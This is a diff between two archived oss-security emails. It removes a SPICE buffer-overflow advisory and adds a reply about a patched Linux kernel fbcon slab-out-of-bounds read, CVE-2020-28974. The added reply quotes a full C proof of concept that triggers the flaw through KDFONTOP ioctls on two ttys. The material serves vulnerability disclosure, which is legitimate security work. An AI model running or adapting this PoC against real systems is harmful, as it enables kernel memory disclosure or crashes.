@@ -1,36 +1,83 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/06/10
-Message-ID: <CAA8xKjW3i-jA6c-UtkvECzmYDMs9NL=i62poTgz6cfi_Z=xgPQ@mail.gmail.com>
-Date: Tue, 6 Oct 2020 14:38:23 +0200
-From: Mauro Matteo Cascella <mcascell@...hat.com>
-To: oss-security@...ts.openwall.com
-Cc: Frediano Ziglio <fziglio@...hat.com>
-Subject: CVE-2020-14355 spice: multiple buffer overflow vulnerabilities in QUIC decoding code
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/25/1
+Message-ID: <0decfd9b-69ed-8acc-2a1d-9bffa5429589@csail.mit.edu>
+Date: Tue, 24 Nov 2020 22:23:24 -0800
+From: "Srivatsa S. Bhat" <srivatsa@...il.mit.edu>
+To: oss-security@...ts.openwall.com, Minh Yuan <yuanmingbuaa@...il.com>
+Subject: Re: Linux kernel slab-out-of-bounds Read in fbcon
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+On 11/9/20 6:41 AM, Minh Yuan wrote:
+> Hi,
+> 
+> We recently discovered a slab-out-of-bounds read in fbcon in the latest
+> kernel ( v5.10-rc2 for now).
+> 
+> The root cause of this vulnerability is that "fbcon_copy_font" did not
+> handle "vc->vc_font.data" and "vc->vc_font.height" consistently. However,
+> the patch <https://lkml.org/lkml/2020/9/27/223> for VT_RESIZEX and the patch
+> <https://lkml.org/lkml/2020/9/24/720> for fbcon_get_font() can't handle
+> this issue.
+> 
+> This is my PoC (it needs the privilege to access tty to trigger this bug):
+> 
+> // author by ziiiro@THU
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <unistd.h>
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <sys/ioctl.h>
+> #include <fcntl.h>
+> #include <linux/fb.h>
+> #include <linux/vt.h>
+> #include <linux/kd.h>
+> #include <string.h>
+> 
+> int main(int argc, char** argv)
+> {
+>     struct console_font_op op;
+>     struct consolefontdesc cfdarg;
+>     void *addr = malloc(0x100);
+>     memset(addr,'a',0x100);
+>     int fd1 = open("/dev/tty1", O_RDWR, 0);
+>     int fd2 = open("/dev/tty6", O_RDWR, 0);
+>     op.op = KD_FONT_OP_SET;
+>     op.width = 8;
+>     op.height = 1;
+>     op.data = addr;
+>     op.charcount = 0x100;
+>     // alloc a samll font.data
+>     ioctl(fd2,KDFONTOP,&op);
+>     op.height = 0x20;
+>     // set a large font.height
+>     ioctl(fd1, KDFONTOP, &op);
+>     op.op = KD_FONT_OP_COPY;
+>     // access tty6's font
+>     op.height = 5;
+>     // use a larger height (tty1) to access the small font.data (tty6)
+>     ioctl(fd1,KDFONTOP,&op);
+> }
+> 
+> The patch for this bug is available: commit
+> 3c4e0dff2095c579b142d5a0693257f1c58b4804 (
+> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4e0dff2095c579b142d5a0693257f1c58b4804
+> )
+> 
+> Timeline:
+> * 6/11/20 - Vulnerability reported to security@...nel.org and
+> linux-distros@...openwall.org.
+> * 9/11/20 - Vulnerability patched.
+> * 9/11/20 - Vulnerability public.
+> 
+> Regards,
+> 
+> Yuan Ming from Tsinghua University
+> 
 
-Multiple buffer overflow vulnerabilities were found in the QUIC image
-decoding process of the SPICE remote display system. More
-specifically, these flaws reside in the spice-common shared code
-between the client and server of SPICE. In other words, both the
-client (spice-gtk) and server are affected by these flaws. A malicious
-client or server could send specially crafted messages which could
-result in a process crash or potential code execution scenario.
+It looks like CVE-2020-28974 has been assigned for this issue.
+https://nvd.nist.gov/vuln/detail/CVE-2020-28974
 
-CVE-2020-14355 has been assigned for this flaw by Red Hat Inc.
-
-Upstream commits:
-* https://gitlab.freedesktop.org/spice/spice-common/-/commit/762e0aba
-* https://gitlab.freedesktop.org/spice/spice-common/-/commit/404d7478
-* https://gitlab.freedesktop.org/spice/spice-common/-/commit/ef1b6ff7
-* https://gitlab.freedesktop.org/spice/spice-common/-/commit/b24fe6b6
-
-Credit: Frediano Ziglio (Red Hat)
-
-Thank you,
-
--- 
-Mauro Matteo Cascella, Red Hat Product Security
-6F78 E20B 5935 928C F0A8  1A9D 4E55 23B8 BB34 10B0
-
+Regards,
+Srivatsa
+VMware Photon OS
